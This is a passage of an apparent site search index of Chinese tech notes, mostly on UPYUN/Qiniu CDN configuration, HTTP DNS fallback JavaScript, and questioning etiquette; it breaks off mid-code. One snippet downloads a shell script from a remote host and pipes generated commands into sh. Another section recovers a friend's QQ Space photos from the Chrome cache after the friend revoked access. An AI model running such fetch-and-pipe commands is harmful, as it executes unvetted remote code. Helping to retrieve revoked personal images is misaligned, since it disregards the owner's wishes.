<p>URL\u5237\u65b0\u4e5f\u662f\u540c\u7406\uff1a</p> <p>\u5b98\u65b9\u6587\u6863\uff1ahttp://docs.upyun.com/api/purge/</p> <p>\u6211\u7684\u4ee3\u7801upyun_purge.py</p> <p>\u6ce8\u610f\u64cd\u4f5c\u5458\u8981\u88ab\u6388\u6743\uff1b\u8c03\u7528API\u6b63\u5e38\u7684\u8fd4\u56de\u503c\u5c31\u662f<code>{'invalid_domain_of_url': {}}</code>\uff0c\u4e0d\u8981\u770b\u5230invalid\u5c31\u4ee5\u4e3a\u51fa\u9519\u4e86hhh</p>"},{"location":"CDN/#upyunwebp","title":"\u4f7f\u7528upyun\u63d0\u4f9b\u7684webp\u529f\u80fd\u8282\u7701\u6d41\u91cf","text":"<p>\u73b0\u5728\u5df2\u7ecf\u6709\u914d\u7f6e\uff0c\u542f\u7528\u540e\u81ea\u52a8\u6839\u636e\u7528\u6237\u7684\u6d4f\u89c8\u5668Accept\u81ea\u52a8\u8fd4\u56dewebp\uff0c\u65e0\u9700\u4efb\u4f55\u64cd\u4f5c</p> <p>\u4e4b\u524d\u7684\u65b9\u6848\uff1a\u65e0\u9700\u4ee3\u7801\uff0c\u53ea\u9700\u8981\u5728\u539f\u56fe\u540e\u9762\u52a0\u4e0a<code>!/format/webp</code>\u5373\u53ef\uff0c\u5047\u8bbe\u5df2\u7ecf\u5728\u4f7f\u7528\u81ea\u5b9a\u4e49\u56fe\u7247\u683c\u5f0f\uff0c\u4f8b\u5982<code>!compress</code>\u5219\u53d8\u4e3a<code>!compress/format/webp</code>\u53ef\u4ee5\u8fdb\u4e00\u6b65\u8282\u7701\u6d41\u91cf</p> <p>\u5b98\u65b9\u8bf4\u660e\uff1a https://www.upyun.com/webp.html</p>"},{"location":"CDN/#404","title":"\u4f7f\u7528\u8fb9\u7f18\u89c4\u5219\u4fee\u590d\u6539\u7248\u5bfc\u81f4\u7684404\u95ee\u9898","text":"<p>\u672c\u7ad9\u539f\u7248\u4f7f\u7528\u7684Jekyll\u5c06xxx.md\u7f16\u8bd1\u4e3axxx.html\uff0c\u73b0\u5728\u6539\u7528MkDocs\u540exxx.md\u7f16\u8bd1\u5f97\u5230\u7684\u662fxxx/index.html\uff0c\u539f\u5148\u7684\u94fe\u63a5\u5c31404\u4e86</p> <p>\u53c8\u62cd\u4e91\u80fd\u914d\u7f6e\u8fb9\u7f18\u89c4\u5219 \u8fdb\u884cURL\u6539\u5199\uff0c\u7528\u6237\u5728\u8bbf\u95eexxx.html\u7684\u65f6\u5019\u5b9e\u9645\u56de\u6e90xxx/</p> <p>\u800c\u4e14\u914d\u7f6e\u633a\u7b80\u5355\uff0c\u53ea\u8981\u4f1a\u5199\u6b63\u5219\u5373\u53ef</p> <p>\u914d\u7f6e\u89c4\u5219\u5982\u4e0b\uff1a</p> <pre><code>\u6761\u4ef6\u5224\u65ad\uff1a \u5982\u679c\u8bf7\u6c42URI \u6b63\u5219\u5339\u914d ^/[^/]*html$\n\u529f\u80fd\u9009\u62e9\uff1a URL\u6539\u5199\nURI \u5b57\u7b26\u4e32\u63d0\u53d6\uff1a ^/([^/]*).html$\n\u6539\u5199\u89c4\u5219\uff1a/$1/\nbreak: \u6253\u52fe\n</code></pre>"},{"location":"CDN/#upyun-upyun-token","title":"UPYUN \u4f7f\u7528\u8fb9\u7f18\u89c4\u5219\u5b9e\u73b0upyun TOKEN\u53cd\u76d7\u94fe\u529f\u80fd","text":"<p>\u60f3\u53ea\u5bf9\u7279\u5b9aurl\u4f7f\u7528token\u53cd\u76d7\u94fe\uff0c\u4e8e\u662f\u5c31\u4f7f\u7528\u8fb9\u7f18\u89c4\u5219\u6765\u5b9e\u73b0\u4e00\u4e0b\u5b8c\u5168\u517c\u5bb9\u53cd\u76d7\u94fe\u7684\u7b97\u6cd5\u54af</p> <p>\u53d1\u73b0\u4e00\u4e2a\u5751\uff1a\u53c8\u62cd\u4e91\u7684\u8fb9\u7f18\u89c4\u5219\u7684<code>$SUB</code>\u51fd\u6570 \u5176from\u548cto\u662f\u4ece1\u5f00\u59cb\u8ba1\u6570\u7684\uff0c\u5305\u62ecfrom\uff0c\u4e5f\u5305\u62ecto</p> <p>URI \u5b57\u7b26\u4e32\u63d0\u53d6\u4e0d\u586b\uff0cbreak\u4e0d\u9009\uff0c\u89c4\u5219\u7f16\u8f91\u5668\u586b\u4ee5\u4e0b\u5185\u5bb9</p> <pre><code>$WHEN($MATCH($_URI, '\u8fd9\u91cc\u586bURI\u5339\u914d\u6b63\u5219'),$OR($GT($_TIME, $SUB($_GET__upt, 9,99)),$NOT($_GET__upt), $NOT($EQ($SUB($MD5('\u8fd9\u91cc\u586bTOKEN''&amp;'$SUB($_GET__upt, 9,99)'&amp;'$_URI),13,20),$SUB($_GET__upt, 1,8)))))$EXIT(403)\n</code></pre>"},{"location":"CDN/#upyun-https","title":"UPYUN https\u8bc1\u4e66\u66f4\u65b0","text":"<p>\u4f7f\u7528F12\u5f00\u53d1\u4eba\u5458\u5de5\u5177\u770b\u7684\u63a5\u53e3\uff0c\u7528Python\u5b9e\u73b0\u4e86\u4e00\u4e0b\uff0c\u4ece\u624b\u52a8\u4e00\u4e2a\u4e2a\u6dfb\u52a0\u8bc1\u4e66\u4e2d\u89e3\u653e\u51fa\u6765</p> <p>https://github.com/zjuchenyuan/EasyLogin/tree/master/examples/upyun/</p>"},{"location":"CDN/#upyun_1","title":"UPYUN \u8868\u5355\u4e0a\u4f20\u600e\u4e48\u7528","text":"<p>\u5728\u529f\u80fd\u914d\u7f6e-\u5b58\u50a8\u7ba1\u7406\u9875\u9762\u53ef\u4ee5\u770b\u5230\u6587\u4ef6\u5bc6\u94a5\uff0c\u5b98\u65b9\u5e2e\u52a9\u6587\u6863\u8fc7\u4e8e\u5206\u6563\uff0c\u8fd9\u91cc\u6574\u7406\u4e00\u4e0b\u5fc5\u987b\u7684\u6b65\u9aa4</p> <p>\u9700\u6c42\uff1a\u7b80\u5355\u7684\u5141\u8bb8\u4e0a\u4f20\u4e00\u4e2a\u56fa\u5b9a\u6587\u4ef6\u540d\u7684\u6587\u4ef6\uff0c\u4e0d\u8981\u8fc7\u671f</p> <p>\u9996\u5148\u5199\u4e00\u4e2a\u4e0a\u4f20\u7b56\u7565policy\uff0c\u7136\u540e\u5bf9\u5b83base64\uff0c\u548c\u5bc6\u94a5\u7528&amp;\u62fc\u63a5\u540e\u8ba1\u7b97md5</p> <p>\u8fd9\u4e2a\u811a\u672c\u5c06\u8f93\u51fa\u53d8\u91cf\u5b9a\u4e49\u548ccurl\u547d\u4ee4\uff0c\u4fbf\u4e8e\u590d\u5236\u4f7f\u7528</p> <pre><code>key='AAA...AAA'\nbucket='demobucket'\nfilename='img.jpg'\n\nfilepath=\"/${filename}\"\npolicy='{\"bucket\":\"'${bucket}'\",\"expiration\":9999999999,\"save-key\":\"'${filepath}'\"}'\nb64_policy=`echo -n $policy|base64 -w0`\n\necho UPYUN_POLICY=${b64_policy}\necho UPYUN_SIGN=$(echo -n \"${b64_policy}&amp;${key}\"|md5sum|awk '{print $1}')\necho \"curl https://v0.api.upyun.com/${bucket} -F file=@${filename} -F policy=\\${UPYUN_POLICY} -F signature=\\${UPYUN_SIGN}\"\n</code></pre> <p>\u6211\u4e5f\u63d0\u4f9b\u4e86\u4e00\u4e2a\u811a\u672c\u4fbf\u4e8e\u4f60\u5feb\u901f\u8c03\u7528\uff1a</p> <pre><code>curl -O d.py3.io/up.sh\nsh up.sh key bucket filename\n\n# \u89e6\u53d1\u4e0a\u4f20\u53ea\u8981\u7ee7\u7eed\u4e22\u7ed9sh\u5c31\u884c\nsh up.sh key bucket filename|sh\n</code></pre>"},{"location":"CDN/#upyun61","title":"UPYUN\u7701\u94b1\u65b9\u6848\uff1a\u7f13\u5b5861\u79d2 \u53d8\u4e3a\u9759\u6001\u8bf7\u6c42","text":"<p>\u867d\u7136\u4eba\u5bb6 \u8ba1\u8d39\u8bf4\u660e \u5199\u7684\u662f</p> <p>\u52a8\u6001\u8bf7\u6c42\u662f\u6307\u56de\u7528\u6237\u6e90\u7ad9\u5e76\u4e14\u7f13\u5b58\u65f6\u95f4\u5c0f\u4e8e 60 \u79d2\u6216\u8005\u6307\u5b9a\u4e0d\u7f13\u5b58\u7684\u8bf7\u6c42\u3002</p> <p>\u4f46\u4ece\u5b9e\u9645\u7684\u8bbf\u95ee\u65e5\u5fd7\u6765\u770b\uff0c\u7f13\u5b5860\u79d2\u662f\u4e0d\u591f\u7684\uff0c\u5fc5\u987b\u7f13\u5b5861\u79d2\u624d\u5f53\u6210\u9759\u6001\u8bf7\u6c42</p> <p>\u9700\u8981\u8fdb\u884c\u7684\u4ee3\u7801\u53d8\u52a8: \u5b50\u57df\u540d+\u76f4\u63a5\u89e3\u6790\u5230\u6e90\u7ad9+\u8de8\u57df\u8bf7\u6c42+\u4e00\u4e2a\u83b7\u53d6cookie\u7684\u8def\u7531</p> <p>\u6ce8\u610f\u5230\u6211\u4eec\u628a\u7f51\u9875\u672c\u8eab\u90fd\u7f13\u5b58\u4e86\uff0c\u6240\u4ee5 \u7f51\u9875\u6e90\u4ee3\u7801\u672c\u8eab\u4e0d\u80fd\u6709\u7528\u6237\u76f8\u5173\u7684\u5185\u5bb9</p> <p>\u7528\u6237\u767b\u5f55\u72b6\u6001\u53ef\u4ee5\u5b58\u5728cookie\u91cc \u6307\u5b9adomain\u7684\u65b9\u5f0f\u8ba9\u5b50\u57df\u540d\u4e5f\u80fd\u83b7\u53d6</p> <p>\u7f13\u5b5861\u79d2\uff0c\u4e00\u822c\u7528\u6237\u8fd8\u662f\u80fd\u89e6\u53d1MISS\uff0c\u4ea7\u751f\u4e00\u6b21\u56de\u6e90\u8bbe\u7f6e\u597dcookie</p> <p>\u4f46\u5982\u679c\u7528\u6237\u8bbf\u95ee\u7684\u5168\u90e8\u662f\u7f13\u5b58\u9875\u9762\uff0c\u524d\u7aef\u4ee3\u7801\u9700\u8981\u5148\u5224\u65adcookie\u662f\u5426\u5b58\u5728\uff0c\u4e0d\u5b58\u5728\u5c31\u9700\u8981\u53d1\u8d77getsession\u8bf7\u6c42\u6765\u83b7\u53d6cookie\u518d\u8fdb\u884c\u8de8\u57df\u8bf7\u6c42</p> <p>\u8fd9\u79cd\u8de8\u57df\u9700\u8981\u5e26\u4e0aCookie\u6240\u4ee5\u662fwithCredential\u7684</p> <p>\u524d\u7aefjs:</p> <pre><code>function queryme(){\n$.ajax({\nurl:\"https://subdomain.www.example.com/uri\",\nsuccess:function(data){\n//...\n},\nxhrFields:{withCredentials:true}\n})\n}\n(function(){\nif(document.cookie.indexOf(\"user=\")&gt;=0){\nqueryme();\n}else{\n$.get(\"/getsession\",null,queryme);\n}\n})();\n</code></pre> <p>\u540e\u7aefNginx:</p> <pre><code>add_header 'Access-Control-Allow-Origin' 'https://www.example.com';\nadd_header 'Access-Control-Allow-Credentials' 'true';\n</code></pre>"},{"location":"CDN/#qiniu","title":"Qiniu","text":""},{"location":"CDN/#qshell","title":"\u4f7f\u7528qshell\u4e0a\u4f20\u6587\u4ef6\u5939","text":"<pre><code>qshell qupload [&lt;ThreadCount&gt;] &lt;LocalUploadConfig&gt;\n</code></pre> <p>\u9700\u8981\u5199\u4e00\u4e2aconfig\u6587\u4ef6\uff0c\u5177\u4f53\u53c2\u89c1\u5b98\u65b9\u6587\u6863</p> <p>https://developer.qiniu.com/kodo/tools/1302/qshell</p> <p>https://github.com/qiniu/qshell/wiki/qupload</p>"},{"location":"CDN/#dnshttp-dnscdn","title":"\u672c\u5730DNS\u4e0d\u9760\u8c31\uff1f\u7528HTTP DNS\u8bbf\u95ee\u6b63\u786e\u7684CDN\u8282\u70b9","text":"<p>\u60c5\u5f62\uff1a\u7528\u6237\u7684DNS\u4e0d\u9760\u8c31\uff0c\u4e0d\u9075\u5faaCDN DNS\u7684TTL\u8bbe\u7f6e\uff0c\u5bfc\u81f4\u7528\u6237\u5f97\u5230\u7684\u8282\u70b9IP\u5df2\u7ecf\u8fc7\u671f\u5931\u6548\uff0c\u5bfc\u81f4\u7f51\u7ad9\u4e0a\u7684\u56fe\u7247\u65e0\u6cd5\u52a0\u8f7d</p> <p>\u89e3\u51b3\u65b9\u6848\uff1a\u4f7f\u7528\u963f\u91cc\u4e91\u7684HTTP DNS (\u652f\u6301HTTPS\u8bf7\u6c42)\uff0c\u7f51\u9875\u7aef\u8bbf\u95ee\u56fe\u7247\u65f6\u5982\u679c\u51fa\u9519\u66ff\u6362\u4e3a\u6307\u5b9aIP\u7684CDN\u8282\u70b9</p>"},{"location":"CDN/#http-dns","title":"HTTP DNS\u63a5\u5165","text":"<p>\u6309\u7167\u6587\u6863\u64cd\u4f5c\u5373\u53ef\uff1a https://help.aliyun.com/document_detail/30113.html</p> <p>\u6ce8\u610f\u5230\u76ee\u524d<code>https://203.107.1.33</code>\u4f1a\u8bc1\u4e66\u9519\u8bef\uff0c\u6539\u7528<code>https://203.107.1.1</code>\u5373\u53ef</p> <p>\u8fd9\u4e2a\u63a5\u53e3\u652f\u6301\u8de8\u57df\u8bf7\u6c42\uff1a</p> <pre><code>$.get(\"https://203.107.1.1/100000/d?host=www.aliyun.com\",null,function(data){\nvar ip = data.ips[0];\nconsole.log(ip);\n});\n</code></pre>"},{"location":"CDN/#_2","title":"\u6cdb\u57df\u540d\u89e3\u6790","text":"<p>\u53c2\u8003 sslip.io</p> <p>\u5047\u8bbe\u6211\u4eec\u6709\u5df2\u7ecf\u5907\u6848\u7684\u57df\u540d<code>example.com</code>\uff0c\u4f7f\u7528<code>xip.example.com</code>\u4f5c\u4e3a\u6cdb\u57df\u540d\u89e3\u6790\u7684\u57df\u540d\uff0c\u4e5f\u5c31\u662f\u8bf4<code>140-205-34-3.xip.example.com</code>\u5c31\u4f1a\u89e3\u6790\u5230<code>140.205.34.3</code></p> <p>\u53ea\u9700\u8981\u8bbe\u7f6e4\u6761NS\u8bb0\u5f55\u5373\u53ef\uff1a</p> <pre><code>ns-aws.nono.io\nns-gce.nono.io\nns-azure.nono.io\nns-vultr.nono.io\n</code></pre>"},{"location":"CDN/#https","title":"\u7533\u8bf7\u6cdb\u57df\u540d\u7684https\u8bc1\u4e66","text":"<p>\u53c2\u89c1\uff1a https://py3.io/Nginx/#acmesh</p>"},{"location":"CDN/#cdn_1","title":"\u914d\u7f6eCDN","text":"<p>\u5c06\u6cdb\u57df\u540d\u7ed1\u5b9a\u5230CDN\u670d\u52a1\u4e0a\uff0c\u5e76\u63d0\u4f9b\u7533\u8bf7\u5230\u7684HTTPS\u8bc1\u4e66\uff0c\u5f00\u542fHTTPS\u8bbf\u95ee</p>"},{"location":"CDN/#js","title":"\u524d\u7aefJS","text":"<p>\u4e0b\u8ff0\u4ee3\u7801\u51fa\u9519\u65f6\u5c06\u628a\u56fe\u7247src\u7684<code>www.aliyun.com</code>\u66ff\u6362\u4e3a<code>1-2-3-4.xip.example.com</code>\uff0c\u7279\u70b9\uff1a</p> <ul> <li>\u53ea\u8981\u4e00\u5f20CDN\u7684\u56fe\u7247\u5df2\u7ecf\u51fa\u9519\u5c31\u4f1a\u5f00\u59cb\u66ff\u6362\u6240\u6709\u574f\u56fe</li> <li>\u4e0d\u4f1a\u66ff\u6362\u5df2\u7ecf\u6210\u529f\u52a0\u8f7d\u7684\u56fe\u7247</li> <li>\u4f7f\u7528localStorage\u7f13\u5b58HTTP DNS\u7684\u67e5\u8be2\u7ed3\u679c \u7f13\u5b58\u4e00\u5468</li> <li>\u5b58\u50a8\u4e86DNS\u7684TTL\u7ed3\u679c\uff0c\u5982\u679cTTL\u5df2\u7ecf\u8fc7\u671f\u5c31\u518d\u6b21\u67e5\u8be2\uff08\u6240\u4ee5\u4e0a\u9762\u7f13\u5b58\u4e00\u5468\u5176\u5b9e\u6ca1\u7528\uff0cTTL\u4e00\u822c\u5c3110\u5206\u949f\uff09</li> </ul> <p>\u53c2\u8003\uff1a </p> <ul> <li>https://stackoverflow.com/questions/736513/how-do-i-parse-a-url-into-hostname-and-path-in-javascript</li> <li>https://stackoverflow.com/questions/92720/jquery-javascript-to-replace-broken-images</li> </ul> <p>\u4f9d\u8d56lscache: https://github.com/pamelafox/lscache</p> <pre><code>var cdnupdating = false;\n\nfunction updatecdn(cb){\nif(cdnupdating) return;\ncdnupdating = true;\n$.get(\"https://203.107.1.1/100000/d?host=www.aliyun.com\",null,function(data){\nvar ip = data.ips[0];\nvar domain = ip.replace(/\\./g, \"-\")+\".xip.example.com\";\nvar ddl=new Date()/1000 + data.ttl;\nvar cdn = {domain:domain, ddl:ddl};\nlscache.set('cdn', cdn, 604800);\nif(cb) cb(cdn);\n});\n}\n\nfunction fixbrokenimages(cdn){\nif(!cdn) cdn=lscache.get(\"cdn\");\nif(!cdn || cdn.ddl &lt; +new Date()/1000) return updatecdn(fixbrokenimages);\n$('img[src*=\"www.aliyun.com\"]').each(function() {\nif (!this.complete || typeof this.naturalWidth == \"undefined\" || this.naturalWidth == 0) {\nthis.src = this.src.replace(\"www.aliyun.com\", cdn.domain);\n}\n});\n}\nvar fixbrokenimages_timer = null;\nfunction image_onerror(){\n//console.log(\"image_onerror\",this.src);\nif(/.*www.aliyun.com.*/.test(this.src)){\nfixbrokenimages();\n}\nif(!fixbrokenimages_timer){\nfixbrokenimages_timer = setInterval(fixbrokenimages , 1000);\n}\n}\n\n$('img[src*=\"www.aliyun.com\"]').on('error', image_onerror);\n</code></pre>"},{"location":"Developer/","title":"Developer","text":""},{"location":"Developer/#_1","title":"\u4fdd\u6301\u6280\u672f\u7cbe\u8fdb","text":"<p>\u5148\u5f97\u6709\u65b9\u5411\uff0c\u6211\u7528\u8fd9\u4e2a\u6280\u672f\u80fd\u7ed9\u6211\u5e26\u6765\u4ec0\u4e48\u56de\u62a5\uff1f\u627e\u5230\u5185\u5728\u52a8\u529b</p> <ol> <li> <p>\u8bfb\u4e66\uff0c\u5b66\u4e60\u89c6\u9891\u8bfe\u7a0b</p> </li> <li> <p>\u53bb\u9605\u8bfb\u6e90\u7801\uff0c\u5927\u7684\u5f00\u6e90\u9879\u76ee\u6709\u65b0\u7684\u6280\u672f\u3001\u5de7\u5999\u7684\u8bbe\u8ba1\u3001\u4f18\u826f\u7684\u67b6\u6784\uff0c\u5bf9\u81ea\u5df1\u5199\u4ee3\u7801\u3001\u67b6\u6784\u7684\u80fd\u529b\u90fd\u6709\u975e\u5e38\u5927\u7684\u63d0\u5347</p> </li> <li> <p>\u5728\u9879\u76ee\u4e2d\u4f7f\u7528\u81ea\u5df1\u60f3\u7528\u7684\u6280\u672f\uff0c\u89e3\u51b3\u73b0\u5b9e\u95ee\u9898</p> </li> <li> <p>\u52a0\u5165\u5f00\u6e90\u9879\u76ee\uff0c\u548c\u725b\u4eba\u4e00\u8d77\u5de5\u4f5c\uff0c\u5411\u725b\u4eba\u770b\u9f50</p> </li> <li> <p>\u52a0\u5165\u9ad8\u624b\u7684\u793e\u7fa4\uff0c\u4e0e\u4f18\u79c0\u7684\u4eba\u5728\u4e00\u8d77</p> </li> </ol>"},{"location":"Developer/#_2","title":"\u5982\u4f55\u660e\u667a\u5730\u5411\u7a0b\u5e8f\u5458\u63d0\u95ee","text":"<p>From: https://z.codes/how-to-ask-computer-question/</p>"},{"location":"Developer/#_3","title":"\u7b80\u77ed\u7248","text":"<p>\u6211\u73b0\u5728\u9047\u5230\u4e00\u4e2a\u95ee\u9898X</p> <p>\u6211\u60f3\u5230\u53ef\u80fd\u7684\u539f\u56e0\u662fa, b, c</p> <p>\u6211\u6392\u9664\u4e86\u4ee5\u4e0b\u53ef\u80fd\u6027d, e, f</p> <p>\u6211\u5c1d\u8bd5\u8fc7\u4ee5\u4e0b\u65b9\u6848g, h, i</p> <p>\u8bf7\u95ee\u8fd8\u6709\u4ec0\u4e48\u662f\u6211\u9057\u6f0f\u7684?</p>"},{"location":"Developer/#_4","title":"\u9996\u5148\u4f60\u9700\u8981\u660e\u767d","text":"<ul> <li> <p>\u7a0b\u5e8f\u5458\u4eec\u53ea\u504f\u7231\u8270\u5de8\u7684\u4efb\u52a1\uff0c\u6216\u8005\u80fd\u6fc0\u53d1\u4ed6\u4eec\u601d\u7ef4\u7684\u597d\u95ee\u9898</p> </li> <li> <p>\u5bf9\u65b9\u6ca1\u6709\u4e49\u52a1\u5fcd\u8010\u4f60\u7684\u65e0\u77e5\u548c\u61d2\u60f0</p> </li> <li> <p>\u5468\u5168\u7684\u601d\u8003\uff0c\u51c6\u5907\u597d\u4f60\u7684\u95ee\u9898\uff0c\u8349\u7387\u7684\u53d1\u95ee\u53ea\u80fd\u5f97\u5230\u8349\u7387\u7684\u56de\u7b54\uff0c\u6216\u8005\u6839\u672c\u5f97\u4e0d\u5230\u4efb\u4f55\u7b54\u6848</p> </li> </ul>"},{"location":"Developer/#_5","title":"\u63d0\u95ee\u4e4b\u524d","text":"<ul> <li> <p>\u7528\u4e2d\u82f1\u6587\u8fdb\u884cGoogle, \u7ffb\u524d\u4e24\u9875\u7684\u7ed3\u679c, \u5f80\u5f80Stack Overflow\u7f51\u7ad9\u4e0a\u7684\u7b54\u6848\u5c31\u662f\u6b63\u786e\u7b54\u6848. \u5982\u679c\u6ca1\u6709\u627e\u5230, \u66f4\u6362\u53ef\u80fd\u7684\u5173\u952e\u8bcd\u591a\u6b21\u5c1d\u8bd5</p> </li> <li> <p>\u5728FAQ/\u6587\u6863\u91cc\u627e\u7b54\u6848, \u8010\u5fc3\u8bfb\u82f1\u6587\u6587\u6863\u662f\u57fa\u672c\u7d20\u517b</p> </li> </ul>"},{"location":"Developer/#_6","title":"\u53d1\u95ee\u7684\u5f62\u5f0f","text":"<ul> <li><p>\u4f7f\u7528\u8a00\u7b80\u610f\u8d45\uff0c\u63cf\u8ff0\u51c6\u786e\u7684\u6807\u9898</p> </li> <li><p>\u7cbe\u786e\u63cf\u8ff0, \u4fe1\u606f\u91cf\u5927, \u4f46\u662f\u4e0d\u5570\u55e6</p> <ul> <li><p>\u5c3d\u53ef\u80fd\u8be6\u7ec6\u800c\u660e\u786e\u7684\u63cf\u8ff0\u75c7\u72b6</p> </li> <li><p>\u63d0\u4f9b\u95ee\u9898\u53d1\u751f\u7684\u73af\u5883\uff08\u673a\u5668\u914d\u7f6e\u3001\u64cd\u4f5c\u7cfb\u7edf\u3001\u5e94\u7528\u7a0b\u5e8f\u4ee5\u53ca\u522b\u7684\u4ec0\u4e48\uff09</p> </li> <li><p>\u8bf4\u660e\u4f60\u5728\u63d0\u95ee\u524d\u662f\u600e\u6837\u53bb\u7814\u7a76\u548c\u7406\u89e3\u8fd9\u4e2a\u95ee\u9898\u7684</p> </li> <li><p>\u8bf4\u660e\u4f60\u5728\u63d0\u95ee\u524d\u91c7\u53d6\u4e86\u4ec0\u4e48\u6b65\u9aa4\u53bb\u89e3\u51b3\u5b83</p> </li> <li><p>\u5728\u81ea\u5df1\u7684\u5c1d\u8bd5\u4e2d, \u6392\u9664\u4e86\u54ea\u4e9b\u53ef\u80fd\u7684\u539f\u56e0</p> </li> <li><p>\u7f57\u5217\u6700\u8fd1\u505a\u8fc7\u4ec0\u4e48\u53ef\u80fd\u6709\u5f71\u54cd\u7684\u786c\u4ef6\u3001\u8f6f\u4ef6\u53d8\u66f4</p> </li> <li><p>\u5c3d\u91cf\u60f3\u8c61\u4e00\u4e2a\u7a0b\u5e8f\u5458\u4f1a\u600e\u6837\u53cd\u95ee\u4f60\uff0c\u5728\u63d0\u95ee\u7684\u65f6\u5019\u9884\u5148\u7ed9\u4ed6\u7b54\u6848</p> </li> </ul> </li> <li><p>\u5bf9\u6bcf\u4e00\u4e2a\u5173\u952e\u6b65\u9aa4\u622a\u56fe, \u5982\u679c\u6709\u9519\u8bef\u4fe1\u606f, **\u622a\u56fe\u548c\u6587\u5b57\u7248**\u8fde\u540c\u4ea7\u751f\u95ee\u9898\u7684**\u4ee3\u7801**\u90fd\u8981\u53d1\u7ed9\u5bf9\u65b9</p> </li> <li><p>\u7ed9\u51fa\u81ea\u5df1\u51fa\u95ee\u9898\u7684\u4ee3\u7801, \u5fc5\u987b\u662f\u5bf9\u65b9\u590d\u5236\u540e\u5c31\u80fd\u7acb\u5373\u8fd0\u884c, \u5e76\u4e14\u590d\u73b0\u95ee\u9898\u7684\u6700\u7b80\u4ee3\u7801.  \u5220\u53bb\u4e0e\u95ee\u9898\u65e0\u5173\u7684\u90e8\u5206</p> </li> <li><p>\u522b\u95ee\u5e94\u8be5\u81ea\u5df1\u89e3\u51b3\u7684\u95ee\u9898, \u907f\u514d\u65e0\u610f\u4e49\u7684\u7591\u95ee</p> </li> </ul>"},{"location":"Developer/#_7","title":"\u95ee\u9898\u89e3\u51b3\u540e","text":"<ul> <li> <p>\u7b80\u77ed\u8bf4\u660e\u81ea\u5df1\u662f\u5982\u4f55\u89e3\u51b3\u7684, \u540e\u7eed\u5c1d\u8bd5\u7684\u8fc7\u7a0b</p> </li> <li> <p>\u5982\u679c\u522b\u4eba\u5bf9\u4f60\u6709\u5e2e\u52a9, \u611f\u8c22\u4e00\u4e0b\u5bf9\u65b9, \u6bd4\u5982\u53d1\u4e2a\u7ea2\u5305\u4ec0\u4e48\u7684</p> </li> </ul>"},{"location":"Developer/#_8","title":"\u9644\u52a0","text":""},{"location":"Developer/#_9","title":"\u53c2\u8003","text":"<p>\u7535\u8111\u51fa\u73b0\u6545\u969c\uff0c\u5982\u4f55\u6b63\u786e\u5730\u63d0\u95ee https://vjudge1.github.io/2015/07/01/how-to-ask.html</p> <p>\u4f60\u4f1a\u95ee\u95ee\u9898\u5417 http://coolshell.cn/articles/3713.html</p> <p>\u300a\u63d0\u95ee\u7684\u827a\u672f\uff1a\u5982\u4f55\u5feb\u901f\u83b7\u5f97\u7b54\u6848\u300b\uff08\u7cbe\u8bfb\u7248\uff09 http://bbs.csdn.net/topics/390307835</p>"},{"location":"Developer/#_10","title":"\u672c\u6587\u7684\u56fe\u7247\u7248","text":"<p>(\u65b9\u4fbf\u5728\u804a\u5929\u5de5\u5177\u91cc\u7529\u7ed9\u5bf9\u65b9):</p> <p></p>"},{"location":"Developer/#chromeqq","title":"\u4f7f\u7528chrome\u7f13\u5b58\u627e\u5230\u88ab\u5220\u7684qq\u7a7a\u95f4\u7684\u56fe\u7247","text":"<p>\u770b\u5230\u6709\u597d\u53cb\u79c0\u6069\u7231\uff0c\u7136\u540e\u5c31\u6ca1\u6709\u6743\u9650\u8bbf\u95ee\u4e86\uff0c\u4f46\u6253\u5f00\u8fc7\u7684\u56fe\u7247\u6709chrome\u7f13\u5b58\uff0c\u4e8e\u662f\u4fbf\u5c1d\u8bd5\u4ece\u7f13\u5b58\u627e\u5230\u56fe\u7247url</p> <p>chrome\u7684\u7f13\u5b58\u53ef\u4ee5\u5728\u8fd9\u91cc\u627e\u5230\uff1a</p> <pre><code>chrome://cache/\n</code></pre> <p>\u7136\u540e\u968f\u610f\u70b9\u5f00\u4e00\u5f20qq\u7a7a\u95f4\u7684\u56fe\u7247\uff0c\u53d1\u73b0\u5176\u5305\u542bpsb\uff08\u6bd5\u7adf\u53f3\u952e\u4fdd\u5b58\u7684\u6587\u4ef6\u540d\u9ed8\u8ba4\u5c31\u662fpsb\uff09\uff0c\u7136\u540e\u5c31\u662f\u641c\u7d22\u54af</p> <p>\u5728\u70b9\u8fdb\u53bb\u7684\u7f13\u5b58\u9875\u9762\u53ef\u4ee5F12\u6267\u884cjs\uff0c\u67e5\u770b\u7f13\u5b58\u56fe\u7247\uff1a</p> <p>\u4ee3\u7801\u6765\u6e90\uff1ahttp://www.sensefulsolutions.com/2012/01/viewing-chrome-cache-easy-way.html</p> <pre><code>    (function() {\nvar preTags = document.getElementsByTagName('pre');\nvar preWithHeaderInfo = preTags[0];\nvar preWithContent = preTags[2];\n\nvar lines = preWithContent.textContent.split('\\n');\n\n// get data about the formatting (changes between different versions of chrome)\nvar rgx = /^(0{8}:\\s+)([0-9a-f]{2}\\s+)[0-9a-f]{2}/m;\nvar match = rgx.exec(lines[0]);\n\nvar text = '';\nfor (var i = 0; i &lt; lines.length; i++) {\nvar line = lines[i];\nvar firstIndex = match[1].length; // first index of the chars to match (e.g. where a '84' would start)\nvar indexJump = match[2].length; // how much space is between each set of numbers\nvar totalCharsPerLine = 16;\nindex = firstIndex;\nfor (var j = 0; j &lt; totalCharsPerLine; j++) {\nvar hexValAsStr = line.substr(index, 2);\nif (hexValAsStr == '  ') {\n// no more chars\nbreak;\n}\n\nvar asciiVal = parseInt(hexValAsStr, 16);\ntext += String.fromCharCode(asciiVal);\n\nindex += indexJump;\n}\n}\n\nvar headerText = preWithHeaderInfo.textContent;\nvar elToInsertBefore = document.body.childNodes[0];\nvar insertedDiv = document.createElement(\"div\");\ndocument.body.insertBefore(insertedDiv, elToInsertBefore);\n\n// find the filename\nvar nodes = [document.body];\nvar filepath = '';\nwhile (true) {\nvar node = nodes.pop();\nif (node.hasChildNodes()) {\nvar children = node.childNodes;\nfor (var i = children.length - 1; i &gt;= 0; i--) {\nnodes.push(children[i]);\n}\n}\n\nif (node.nodeType === Node.TEXT_NODE &amp;&amp; /\\S/.test(node.nodeValue)) {\n// 1st depth-first text node (with non-whitespace chars) found\nfilepath = node.nodeValue;\nbreak;\n}\n}\n\noutputResults(insertedDiv, convertToBase64(text), filepath, headerText);\n\ninsertedDiv.appendChild(document.createElement('hr'));\n\nfunction outputResults(parentElement, fileContents, fileUrl, headerText) {\n// last updated 1/27/12\nvar rgx = /.+\\/([^\\/]+)/;\nvar filename = rgx.exec(fileUrl)[1];\n\n// get the content type\nrgx = /content-type: (.+)/i;\nvar match = rgx.exec(headerText);\nvar contentTypeFound = match != null;\nvar contentType = 